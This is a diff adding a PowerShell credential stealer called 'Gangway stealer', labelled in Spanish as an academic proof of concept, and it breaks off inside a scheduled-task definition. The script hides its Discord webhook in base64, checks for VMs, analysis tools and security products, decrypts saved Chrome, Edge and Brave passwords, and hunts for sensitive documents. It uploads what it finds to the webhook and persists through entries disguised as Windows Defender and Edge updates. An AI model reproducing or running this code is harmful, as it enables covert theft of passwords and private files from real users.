@@ -1,0 +1,1815 @@
+<#
+Gangway stealer (Versión corregida y depurada - PoC académico)
+1. Código optimizado y con errores de sintaxis arreglados
+2. Funcionalidad mejorada
+3. Con fines exclusivamente educativos y de investigación
+#>
+
+# --- CONFIGURACIÓN ---
+# Modo Debug para desarrollo/pruebas
+$DebugMode = $false
+
+# --- Variables Globales ---
+$ScriptPath = $PSCommandPath
+if (-not $ScriptPath) { $ScriptPath = "$env:TEMP\script.ps1" }
+
+$WEBHOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NDg2NzcxNTE3MjU5Nzg0MC8tNDM1RHY4LUpHQ2h4S1VXQkh1MERDRUVTTzlad0ZXcFBad0kxbTRmWDRqejhRSi1uQXhBVTQyTGNRS2Ixd2VZQmpnTA=="))
+$PERSIST = $true
+$MAX_FILE_SIZE = 3MB  # 3MB max para subidas a Discord
+
+# --- Funciones de Registro ---
+function Write-Log {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Message,
+        
+        [Parameter()]
+        [ValidateSet("INFO", "WARNING", "ERROR", "DEBUG")]
+        [string]$Level = "INFO"
+    )
+    
+    if (($Level -eq "DEBUG") -and (-not $DebugMode)) { return }
+    
+    $logFile = "$env:TEMP\operations.log"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    
+    try {
+        Add-Content -Path $logFile -Value $logMessage -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    # En modo debug, también mostrar en consola
+    if ($DebugMode) {
+        switch ($Level) {
+            "INFO"    { Write-Host $logMessage -ForegroundColor White }
+            "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
+            "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
+            "DEBUG"   { Write-Host $logMessage -ForegroundColor Cyan }
+        }
+    }
+}
+
+# --- Declaraciones P/Invoke ---
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32Functions {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LASTINPUTINFO {
+        public uint cbSize;
+        public uint dwTime;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public int cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [DllImport("user32.dll")]
+    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcess(
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        ref PROCESS_INFORMATION lpProcessInformation
+    );
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtectEx(
+        IntPtr hProcess,
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        ref uint lpflOldProtect
+    );
+    
+    public static uint GetIdleTime() {
+        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
+        lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
+        GetLastInputInfo(ref lastInputInfo);
+        return ((uint)Environment.TickCount - lastInputInfo.dwTime);
+    }
+}
+"@
+
+# --- Verificación de dependencias ---
+function Ensure-SQLiteDependency {
+    try {
+        # Primero intentar cargar si ya existe
+        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
+        Write-Log "SQLite ya está cargado" -Level "DEBUG"
+        return $true
+    }
+    catch {
+        Write-Log "Intentando cargar SQLite desde ubicación alternativa" -Level "DEBUG"
+        
+        # Verificar si existe en ubicaciones comunes
+        $possiblePaths = @(
+            "$env:ProgramFiles\System.Data.SQLite\2010\bin\System.Data.SQLite.dll",
+            "$env:TEMP\System.Data.SQLite.dll",
+            ".\System.Data.SQLite.dll"
+        )
+        
+        foreach ($path in $possiblePaths) {
+            if (Test-Path $path) {
+                try {
+                    Add-Type -Path $path -ErrorAction Stop
+                    Write-Log "SQLite cargado desde $path" -Level "DEBUG"
+                    return $true
+                }
+                catch {
+                    Write-Log "Error al cargar SQLite desde $path: $_" -Level "DEBUG"
+                }
+            }
+        }
+        
+        # Último recurso: descargar e instalar
+        $sqlitePath = "$env:TEMP\System.Data.SQLite.dll"
+        try {
+            # Verificar si tenemos conexión a Internet
+            if (-not (Test-Connection 8.8.8.8 -Count 1 -Quiet)) {
+                Write-Log "Sin conexión a Internet para descargar SQLite" -Level "WARNING"
+                return $false
+            }
+            
+            $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx40-binary-bundle-x64-2010-1.0.118.0.zip"
+            $zipPath = "$env:TEMP\sqlite.zip"
+            
+            # Usar método de WebClient en lugar de Invoke-WebRequest para compatibilidad
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($sqliteUrl, $zipPath)
+            
+            # Extraer usando Shell.Application
+            $shell = New-Object -ComObject Shell.Application
+            $zipFolder = $shell.NameSpace($zipPath)
+            $destFolder = $shell.NameSpace($env:TEMP)
+            $destFolder.CopyHere($zipFolder.Items(), 0x14) # 0x14 = No UI + No Confirm Overwrite
+            
+            if (Test-Path "$env:TEMP\SQLite.Interop.dll") {
+                Copy-Item "$env:TEMP\SQLite.Interop.dll" -Destination $env:TEMP
+            }
+            
+            # Buscar la DLL recursivamente
+            $sqliteDll = Get-ChildItem -Path $env:TEMP -Filter "System.Data.SQLite.dll" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($sqliteDll) {
+                Copy-Item $sqliteDll.FullName -Destination $sqlitePath
+                Add-Type -Path $sqlitePath
+                Write-Log "SQLite descargado y cargado exitosamente" -Level "DEBUG"
+                return $true
+            }
+        }
+        catch {
+            Write-Log "Error al descargar SQLite: $_" -Level "ERROR"
+        }
+        finally {
+            if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
+        }
+    }
+    
+    # Si llegamos aquí, no pudimos cargar SQLite
+    return $false
+}
+
+# --- Funciones de verificación ---
+function Test-AdminRights {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Test-Hypervisor {
+    # Verificar procesos comunes de VM
+    $vmProcesses = @("vmtoolsd", "vboxservice", "qemu-ga")
+    foreach ($proc in $vmProcesses) {
+        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { 
+            Write-Log "Proceso VM detectado: $proc" -Level "DEBUG"
+            return $true 
+        }
+    }
+    
+    # Verificar características de hardware
+    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
+    if ($computerSystem -and $computerSystem.Model -match 'Virtual|VMware|VBox|QEMU|Xen') {
+        Write-Log "Modelo de sistema virtual detectado: $($computerSystem.Model)" -Level "DEBUG"
+        return $true
+    }
+    
+    return $false
+}
+
+function Test-UserActivity {
+    # Verificar tiempo de inactividad
+    $idleTimeMinutes = [Win32Functions]::GetIdleTime() / 1000 / 60
+    
+    Write-Log "Tiempo de inactividad: $idleTimeMinutes minutos" -Level "DEBUG"
+    
+    # Considerar activo si ha habido interacción en los últimos 5 minutos
+    return $idleTimeMinutes -lt 5
+}
+
+function Test-SafeEnvironment {
+    Write-Log "Verificando entorno" -Level "DEBUG"
+    
+    # 1. Detección de Hardware Virtual (solo registro, no salida)
+    $hwChecks = @(
+        (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Model -match 'Virtual|VMware|VBox|QEMU|Xen',
+        (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).SerialNumber -match 'VMware|Virtual|0{5,}',
+        (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).Name -match 'Virtual|KVM|Hyper-V'
+    )
+    
+    if ($hwChecks -contains $true) { 
+        Write-Log "Entorno virtual detectado" -Level "DEBUG"
+    }
+    
+    # 2. Análisis de Recursos del Sistema (solo para registro)
+    try {
+        $memory = (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
+        $diskSize = (Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue).Size / 1GB
+        $cpuCores = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).NumberOfCores
+        
+        Write-Log "Recursos del sistema - RAM: $($memory)GB, Disco: $($diskSize)GB, Núcleos: $cpuCores" -Level "DEBUG"
+    }
+    catch {
+        Write-Log "Error al verificar recursos del sistema: $_" -Level "WARNING"
+    }
+    
+    # 3. Procesos de Análisis (mejorado y simplificado)
+    $blacklistedProcesses = @(
+        "procmon", "wireshark", "fiddler", "ProcessHacker",
+        "x32dbg", "x64dbg", "ollydbg", "dnSpy", "sysmon"
+    )
+    
+    $runningProcNames = (Get-Process | Select-Object -ExpandProperty Name)
+    $detectedAnalysisTools = $runningProcNames | Where-Object { $blacklistedProcesses -contains $_ }
+    
+    if ($detectedAnalysisTools) {
+        Write-Log "Herramientas de análisis detectadas: $($detectedAnalysisTools -join ', ')" -Level "WARNING"
+        return $false
+    }
+    
+    # 4. Comportamiento de Usuario
+    if (-not (Test-UserActivity)) {
+        Write-Log "Sin actividad de usuario reciente" -Level "DEBUG"
+    }
+    
+    # 5. Tiempo de Ejecución del Sistema
+    try {
+        $uptime = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
+        $uptimeMinutes = ((Get-Date) - $uptime).TotalMinutes
+        
+        Write-Log "Tiempo de ejecución del sistema: $uptimeMinutes minutos" -Level "DEBUG"
+        
+        if ($uptimeMinutes -lt 10) {
+            Write-Log "Sistema iniciado muy recientemente" -Level "WARNING"
+        }
+    }
+    catch {
+        Write-Log "Error al verificar uptime: $_" -Level "DEBUG"
+    }
+    
+    # Simplificamos la verificación para fines del PoC
+    return $true
+}
+
+function Test-SafeElevation {
+    # Verificar presencia de productos de seguridad
+    $securityProcesses = @("MSASCui", "McUICnt", "CSFalconService", "CrowdStrike", "SentinelAgent")
+    
+    foreach ($proc in $securityProcesses) {
+        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { 
+            Write-Log "Producto de seguridad detectado: $proc" -Level "WARNING"
+            return $false 
+        }
+    }
+    
+    Write-Log "No se detectaron productos de seguridad que impidan elevación" -Level "DEBUG"
+    return $true
+}
+
+# --- Funciones principales ---
+function Get-BrowserCredentials {
+    Write-Log "Iniciando extracción de credenciales de navegadores" -Level "DEBUG"
+    
+    # Verificar dependencia SQLite
+    if (-not (Ensure-SQLiteDependency)) {
+        Write-Log "No se pudo cargar SQLite, saltando extracción de navegadores" -Level "WARNING"
+        return "No se pudieron extraer credenciales: falta dependencia SQLite."
+    }
+    
+    $results = [System.Collections.Generic.List[string]]::new()
+    
+    # Lista actualizada de rutas (incluye perfiles múltiples y Edge Beta)
+    $browserPaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge*\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+    )
+    
+    # Bypass temporal de File Lock usando shadow copy
+    $tempFolder = "$env:TEMP\$(New-Guid)"
+    New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
+    
+    try {
+        foreach ($path in $browserPaths) {
+            $resolvedPaths = Resolve-Path $path -ErrorAction SilentlyContinue
+            if (-not $resolvedPaths) {
+                Write-Log "No se encontraron bases de datos para patrón: $path" -Level "DEBUG"
+                continue
+            }
+            
+            foreach ($dbPath in $resolvedPaths.Path) {
+                try {
+                    Write-Log "Procesando base de datos: $dbPath" -Level "DEBUG"
+                    
+                    # Verificar si el archivo existe y es accesible
+                    if (-not (Test-Path $dbPath -ErrorAction Stop)) {
+                        Write-Log "Base de datos no encontrada: $dbPath" -Level "DEBUG"
+                        continue
+                    }
+                    
+                    # Copia usando streams nativos para evitar bloqueos
+                    $tempCopy = "$tempFolder\$(Split-Path $dbPath -Leaf)_$(Get-Random)"
+                    
+                    try {
+                        # Usar método de copia más confiable
+                        [System.IO.File]::Copy($dbPath, $tempCopy)
+                    }
+                    catch {
+                        Write-Log "Error al copiar base de datos, intentando método alternativo: $_" -Level "DEBUG"
+                        Copy-Item -Path $dbPath -Destination $tempCopy -Force
+                    }
+                    
+                    if (-not (Test-Path $tempCopy)) {
+                        Write-Log "Fallo al crear copia de trabajo" -Level "DEBUG"
+                        continue
+                    }
+                    
+                    # Conexión SQLite optimizada
+                    $connString = "Data Source=$tempCopy;Version=3;Read Only=True"
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
+                    
+                    try {
+                        $conn.Open()
+                        
+                        # Query parametrizada para evitar inyección
+                        $cmd = $conn.CreateCommand()
+                        $cmd.CommandText = @"
+SELECT
+    origin_url,
+    username_value,
+    password_value,
+    date_created
+FROM logins
+WHERE
+    blacklisted_by_user = 0
+ORDER BY date_created DESC
+LIMIT 50
+"@
+                        $reader = $cmd.ExecuteReader()
+                        
+                        $counter = 0
+                        while ($reader.Read()) {
+                            try {
+                                $url = $reader.GetString(0)
+                                $username = $reader.GetString(1)
+                                $encryptedBytes = $reader.GetValue(2)
+                                $dateCreated = $reader.GetValue(3)
+                                
+                                # Si no hay contraseña encriptada, continuar
+                                if ($encryptedBytes -eq $null -or $encryptedBytes.Length -eq 0) {
+                                    continue
+                                }
+                                
+                                $plainBytes = $null
+                                $password = ""
+                                
+                                try {
+                                    # Desencriptar los bytes de contraseña usando DPAPI
+                                    $plainBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                                        $encryptedBytes,
+                                        $null,
+                                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                                    )
+                                    
+                                    if ($plainBytes) {
+                                        $password = [System.Text.Encoding]::UTF8.GetString($plainBytes)
+                                    }
+                                }
+                                catch {
+                                    $password = "[Error al descifrar]"
+                                    Write-Log "Error al descifrar contraseña: $_" -Level "DEBUG"
+                                }
+                                
+                                # Convertir date_created a DateTime
+                                $lastUsed = [datetime]::MinValue
+                                if ($dateCreated -is [long]) {
+                                    # Google Chrome/Edge almacena como microsegundos desde 1601-01-01
+                                    $lastUsed = [datetime]::FromFileTime($dateCreated * 10)
+                                }
+                                else {
+                                    # Fallback a fecha actual
+                                    $lastUsed = Get-Date
+                                }
+                                
+                                $entry = @{
+                                    URL = $url
+                                    User = $username
+                                    Password = $password
+                                    LastUsed = $lastUsed
+                                }
+                                
+                                $results.Add(
+                                    "[$(Get-Date -Format 'HH:mm:ss')] Credential Found!`n" +
+                                    "URL: $($entry.URL)`n" +
+                                    "User: $($entry.User)`n" +
+                                    "Password: $($entry.Password)`n" +
+                                    "Last Used: $($entry.LastUsed.ToString('yyyy-MM-dd HH:mm'))"
+                                )
+                                
+                                $counter++
+                            }
+                            catch {
+                                Write-Log "Error procesando entrada: $_" -Level "DEBUG"
+                                continue
+                            }
+                        }
+                        
+                        Write-Log "Extraídas $counter credenciales de $dbPath" -Level "DEBUG"
+                    }
+                    catch {
+                        Write-Log "Error al leer base de datos: $_" -Level "DEBUG"
+                    }
+                    finally {
+                        # Limpieza segura
+                        if ($conn.State -eq 'Open') { 
+                            $conn.Close()
+                            $conn.Dispose()
+                        }
+                        
+                        if (Test-Path $tempCopy) {
+                            # Limpieza segura: sobreescribir con bytes aleatorios
+                            $buffer = New-Object byte[] 1024
+                            $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+                            $rng.GetBytes($buffer)
+                            
+                            [System.IO.File]::WriteAllBytes($tempCopy, $buffer)
+                            Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                }
+                catch {
+                    Write-Log "Error procesando $dbPath : $_" -Level "DEBUG"
+                    continue
+                }
+            }
+        }
+    }
+    catch {
+        Write-Log "Error general en extracción de credenciales: $_" -Level "ERROR"
+    }
+    finally {
+        # Borrado seguro del directorio temporal
+        if (Test-Path $tempFolder) {
+            Remove-Item $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+    
+    if ($results.Count -eq 0) {
+        return "No se encontraron credenciales."
+    }
+    
+    return $results -join "`n`n------------------------------------`n"
+}
+
+function Find-InterestingFiles {
+    Write-Log "Buscando archivos de interés" -Level "DEBUG"
+    
+    $filePatterns = @('*.pdf', '*.doc*', '*.xls*', '*.rdp', '*.kdbx', '*.txt', '*.csv')
+    $keywords = @('password', 'secret', 'confidential', 'login', 'credentials', 'contraseña', 'secreto', 'confidencial')
+    $excludedFolders = @('Windows', 'Program Files', 'Program Files (x86)', 'Temp', 'tmp', '$RECYCLE.BIN')
+    
+    # Rutas de destino más específicas
+    $targetPaths = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads",
+        "$env:APPDATA"
+    )
+    
+    # Agregar unidades mapeadas si existen
+    $mappedDrives = Get-WmiObject -Class Win32_MappedLogicalDisk -ErrorAction SilentlyContinue | 
+                    Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
+    
+    if ($mappedDrives) {
+        $targetPaths += $mappedDrives
+    }
+    
+    $filesFound = [System.Collections.Generic.List[object]]::new()
+    
+    foreach ($path in $targetPaths) {
+        try {
+            if (-not (Test-Path $path)) { 
+                Write-Log "Ruta $path no encontrada, omitiendo" -Level "DEBUG"
+                continue 
+            }
+            
+            Write-Log "Escaneando $path por archivos de interés" -Level "DEBUG"
+            
+            # Usando cmdlet más eficiente
+            $files = Get-ChildItem -Path $path -Include $filePatterns -Recurse -Depth 2 -ErrorAction SilentlyContinue -File |
+                Where-Object {
+                    $_.Length -lt $MAX_FILE_SIZE -and
+                    $excludedFolders -notcontains $_.Directory.Name -and
+                    $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and
+                    (-not $_.Name.StartsWith('~$'))
+                } |
+                Select-Object -First 50
+            
+            foreach ($file in $files) {
+                $priority = 1
+                
+                # Verificar contenido para archivos pequeños de texto
+                if ($file.Length -lt 1MB -and ($file.Extension -eq '.txt' -or $file.Extension -eq '.csv')) {
+                    try {
+                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue -TotalCount 1000
+                        
+                        if ($content) {
+                            foreach ($keyword in $keywords) {
+                                if ($content -match $keyword) {
+                                    $priority += 1
+                                }
+                            }
+                        }
+                    }
+                    catch {
+                        Write-Log "Error leyendo $($file.FullName): $_" -Level "DEBUG"
+                    }
+                }
+                
+                # Prioridad por nombre
+                foreach ($keyword in $keywords) {
+                    if ($file.Name -match $keyword) {
+                        $priority += 2
+                    }
+                }
+                
+                # Prioridad por últimos documentos editados
+                if ($file.LastWriteTime -gt (Get-Date).AddHours(-24)) {
+                    $priority += 1
+                }
+                
+                $filesFound.Add([PSCustomObject]@{
+                    File = $file
+                    Priority = $priority
+                })
+            }
+        }
+        catch {
+            Write-Log "Error al escanear $path : $_" -Level "DEBUG"
+        }
+    }
+    
+    $result = $filesFound |
+        Sort-Object -Property Priority -Descending |
+        Select-Object -First 15 -ExpandProperty File
+    
+    Write-Log "Se encontraron $($result.Count) archivos de interés" -Level "DEBUG"
+    return $result
+}
+
+function Send-DiscordMessage {
+    param(
+        [string]$Message,
+        [string]$FilePath = $null,
+        [int]$MaxRetries = 2
+    )
+    
+    Write-Log "Enviando mensaje a Discord" -Level "DEBUG"
+    if ($FilePath) {
+        Write-Log "Con archivo adjunto: $FilePath" -Level "DEBUG"
+    }
+    
+    # Verificar conexión a Internet
+    if (-not (Test-Connection 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue)) {
+        Write-Log "Sin conexión a Internet, no se puede enviar mensaje" -Level "WARNING"
+        return $false
+    }
+    
+    # Configuración avanzada
+    $userAgents = @(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
+    )
+    
+    # Función interna para construcción del cuerpo
+    function Build-MultipartContent {
+        param(
+            [string]$msg,
+            [string]$file
+        )
+        
+        $boundary = "---------------------------" + [System.DateTime]::Now.Ticks.ToString("x")
+        
+        $LF = "`r`n"
+        $bodyLines = New-Object System.Text.StringBuilder
+        
+        # Parte de mensaje de texto
+        [void]$bodyLines.AppendLine("--$boundary")
+        [void]$bodyLines.AppendLine('Content-Disposition: form-data; name="content"')
+        [void]$bodyLines.AppendLine()
+        [void]$bodyLines.AppendLine($msg)
+        
+        # Parte de archivo si existe
+        if ($file -and (Test-Path $file)) {
+            $fileName = [System.IO.Path]::GetFileName($file)
+            $fileBytes = [System.IO.File]::ReadAllBytes($file)
+            
+            # Determinar Content-Type
+            $contentType = "application/octet-stream"
+            $extension = [System.IO.Path]::GetExtension($file).ToLower()
+            
+            switch ($extension) {
+                ".txt"  { $contentType = "text/plain" }
+                ".pdf"  { $contentType = "application/pdf" }
+                ".docx" { $contentType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }
+                ".xlsx" { $contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }
+                ".jpg"  { $contentType = "image/jpeg" }
+                ".png"  { $contentType = "image/png" }
+            }
+            
+            [void]$bodyLines.AppendLine("--$boundary")
+            [void]$bodyLines.AppendLine("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"")
+            [void]$bodyLines.AppendLine("Content-Type: $contentType")
+            [void]$bodyLines.AppendLine()
+            
+            # Convertir el archivo a Base64 para texto
+            $base64Content = [System.Convert]::ToBase64String($fileBytes)
+            [void]$bodyLines.AppendLine($base64Content)
+        }
+        
+        [void]$bodyLines.AppendLine("--$boundary--")
+        
+        return @{
+            Content = $bodyLines.ToString()
+            Boundary = $boundary
+        }
+    }
+    
+    # Lógica de reintento
+    $attempt = 0
+    do {
+        try {
+            # Retraso anti-patrón
+            $delay = Get-Random -Minimum 500 -Maximum 2000
+            Start-Sleep -Milliseconds $delay
+            
+            # Configurar TLS moderno
+            [System.Net.ServicePointManager]::SecurityProtocol = 
+                [System.Net.SecurityProtocolType]::Tls12
+            
+            # Crear contenido multipart
+            $multipartData = Build-MultipartContent -msg $Message -file $FilePath
+            $body = $multipartData.Content
+            $boundary = $multipartData.Boundary
+            
+            # Configurar headers
+            $headers = @{
+                "User-Agent" = $userAgents | Get-Random
+                "Accept"     = "*/*"
+                "Content-Type" = "multipart/form-data; boundary=$boundary"
+            }
+            
+            # Crear y configurar la solicitud Web
+            $request = [System.Net.WebRequest]::Create($WEBHOOK)
+            $request.Method = "POST"
+            $request.ContentType = "multipart/form-data; boundary=$boundary"
+            
+            foreach ($header in $headers.GetEnumerator()) {
+                $request.Headers.Add($header.Key, $header.Value)
+            }
+            
+            # Preparar el cuerpo de la solicitud
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+            $request.ContentLength = $bytes.Length
+            
+            # Escribir al stream de la solicitud
+            try {
+                $requestStream = $request.GetRequestStream()
+                $requestStream.Write($bytes, 0, $bytes.Length)
+            }
+            finally {
+                if ($requestStream) { $requestStream.Dispose() }
+            }
+            
+            # Obtener respuesta
+            try {
+                $response = $request.GetResponse()
+                $responseStream = $response.GetResponseStream()
+                $reader = New-Object System.IO.StreamReader($responseStream)
+                $responseContent = $reader.ReadToEnd()
+                
+                Write-Log "Respuesta recibida: $responseContent" -Level "DEBUG"
+                
+                # Limpieza post-envío
+                if ($FilePath -and (Test-Path $FilePath)) {
+                    # Sobrescribir archivo temporal antes de borrar
+                    $fileSize = (Get-Item $FilePath).Length
+                    $zeros = New-Object byte[] $fileSize
+                    
+                    try {
+                        [System.IO.File]::WriteAllBytes($FilePath, $zeros)
+                    }
+                    catch {
+                        Write-Log "Error al limpiar archivo: $_" -Level "DEBUG"
+                    }
+                }
+                
+                return $true
+            }
+            finally {
+                if ($reader) { $reader.Dispose() }
+                if ($responseStream) { $responseStream.Dispose() }
+                if ($response) { $response.Dispose() }
+            }
+        }
+        catch [System.Net.WebException] {
+            $attempt++
+            $errorResponse = $_.Exception.Response
+            
+            if ($errorResponse) {
+                $errorStream = $errorResponse.GetResponseStream()
+                $reader = New-Object System.IO.StreamReader($errorStream)
+                $errorContent = $reader.ReadToEnd()
+                
+                Write-Log "Error de Discord: $errorContent" -Level "WARNING"
+                $reader.Dispose()
+            }
+            else {
+                Write-Log "Error de conexión: $($_.Exception.Message)" -Level "WARNING"
+            }
+            
+            # Backoff exponencial
+            Start-Sleep -Seconds ([Math]::Pow(2, $attempt))
+        }
+        catch {
+            $attempt++
+            Write-Log "Error al enviar mensaje: $($_.Exception.Message)" -Level "WARNING"
+            
+            # Backoff exponencial
+            Start-Sleep -Seconds ([Math]::Pow(2, $attempt))
+        }
+    } while ($attempt -lt $MaxRetries)
+    
+    Write-Log "No se pudo enviar mensaje después de $MaxRetries intentos" -Level "WARNING"
+    return $false
+}
+
+# --- Funciones de persistencia ---
+function Install-Persistence {
+    param(
+        [ValidateSet("Basic","Stealth","Nuclear")][string]$Mode = "Stealth",
+        [int]$TriggerDays = 7
+    )
+    
+    Write-Log "Instalando persistencia (Modo: $Mode)" -Level "DEBUG"
+    
+    # Verificar si tenemos privilegios para persistencia avanzada
+    $isAdmin = Test-AdminRights
+    
+    # --- Técnicas Base (Low Privilege) ---
+    if ($Mode -ne "Nuclear") {
+        try {
+            # 1. Startup Folder Manipulation (Menos monitoreado que Run key)
+            $startupPath = [Environment]::GetFolderPath('Startup')
+            $lnkPath = "$startupPath\WindowsDefenderUpdate.lnk"
+            
+            Write-Log "Creando acceso directo de inicio: $lnkPath" -Level "DEBUG"
+            
+            # Crear acceso directo usando COM
+            $WshShell = New-Object -ComObject WScript.Shell
+            $shortcut = $WshShell.CreateShortcut($lnkPath)
+            $shortcut.TargetPath = "powershell.exe"
+            $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+            $shortcut.IconLocation = "shell32.dll,21"
+            $shortcut.Save()
+            
+            # 2. Persistencia en Registro (Run key)
+            $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+            $registryName = "WindowsDefenderUpdater"
+            $registryValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+            
+            Write-Log "Creando entrada de registro: $registryPath\$registryName" -Level "DEBUG"
+            
+            # Verificar existencia y crear/actualizar
+            if (-not (Test-Path $registryPath)) {
+                New-Item -Path $registryPath -Force | Out-Null
+            }
+            
+            Set-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -Type String
+            
+            # 3. FileTime Trigger (Persistencia condicional)
+            $lastWriteKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileAssociation"
+            
+            # Verificar existencia
+            if (-not (Test-Path $lastWriteKey)) {
+                New-Item -Path $lastWriteKey -Force | Out-Null
+            }
+            
+            $lastRun = Get-ItemProperty -Path $lastWriteKey -Name "LastRun" -ErrorAction SilentlyContinue
+            
+            if ((-not $lastRun) -or ((Get-Date) -gt ([datetime]::FromFileTime($lastRun.LastRun)).AddDays($TriggerDays))) {
+                Write-Log "Actualizando timestamp de activación" -Level "DEBUG"
+                Set-ItemProperty -Path $lastWriteKey -Name "LastRun" -Type QWord -Value (Get-Date).ToFileTime()
+            }
+        }
+        catch {
+            Write-Log "Error en persistencia básica: $_" -Level "ERROR"
+        }
+    }
+    
+    # --- Técnicas Avanzadas (Requiere Admin) ---
+    if ($isAdmin -and ($Mode -ne "Basic")) {
+        try {
+            Write-Log "Aplicando técnicas de persistencia avanzada" -Level "DEBUG"
+            
+            # 3. Tarea programada con permisos elevados
+            $taskName = "MicrosoftEdge\Update"
+            $taskDescription = "Microsoft Edge Update"
+            $taskCommand = "powershell.exe"
+            $taskArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+            
+            # Eliminar tarea si existe
+            schtasks /Delete /TN $taskName /F 2>$null | Out-Null
+            
+            # Crear nueva tarea
+            $taskXml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>$taskDescription</Description>
+    <URI>\$taskName</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT10M</Delay>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT5M</Delay>
+    </BootTrigger>
